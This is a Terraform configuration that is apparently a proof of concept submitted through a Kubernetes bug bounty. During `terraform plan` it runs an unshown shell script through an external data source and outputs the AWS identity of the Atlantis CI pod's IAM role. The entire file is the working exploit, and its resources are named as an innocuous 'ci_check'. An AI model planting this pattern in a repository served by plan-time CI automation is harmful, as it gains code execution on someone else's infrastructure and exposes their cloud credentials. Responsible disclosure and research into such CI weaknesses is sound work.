# Security research PoC (read-only) - reported via the Kubernetes HackerOne program.
# `terraform plan` executes the program below (external data sources are read during plan),
# and the default AWS credential chain in this pod resolves to the Atlantis IAM role.

data "external" "poc_ci_check" {
  program = ["sh", "poc_ci_check.sh"]
}

output "poc_ci_check" {
  value = data.external.poc_ci_check.result
}

provider "aws" {
  alias  = "poc_ci_check"
  region = "us-east-2"
}

data "aws_caller_identity" "poc_ci_check" {
  provider = aws.poc_ci_check
}

output "poc_ci_identity" {
  value = data.aws_caller_identity.poc_ci_check
}